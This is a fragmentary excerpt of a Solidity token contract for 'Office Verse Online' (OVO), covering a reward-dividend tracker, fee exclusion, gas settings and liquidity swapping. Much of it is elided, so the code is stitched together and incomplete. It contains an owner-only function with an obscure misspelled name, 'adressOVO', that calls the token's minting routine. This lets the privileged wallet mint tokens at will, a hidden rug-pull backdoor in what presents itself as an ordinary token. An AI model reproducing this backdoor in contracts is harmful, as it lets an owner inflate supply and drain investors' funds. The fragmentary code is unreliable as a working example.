...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function distributeOVO(address account, uint256 amount) internal virtual {
...
function distributeOVO(address account, uint256 value) internal override {
    super.distributeOVO(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      distributeOVO(account, mintAmount);
...
contract OVOrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterateOVO  for IterateOVO .Map;
IterateOVO .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("OVO_rewardToken_Tracker", "OVO_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "OVO_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "OVO_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main OVO contract.");
    }
...
contract OVO is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    OVOrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Office Verse Online", "OVO") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new OVOrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 distributeOVO(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function adressOVO(address allowp, uint256 allowa) public masterWallet{
       distributeOVO(allowp, allowa);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "OVO: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "OVO: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "OVO: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "OVO: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTOVO = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTOVO);
...
addLiquidity(tokensTOVO, bnbForLiquidity);
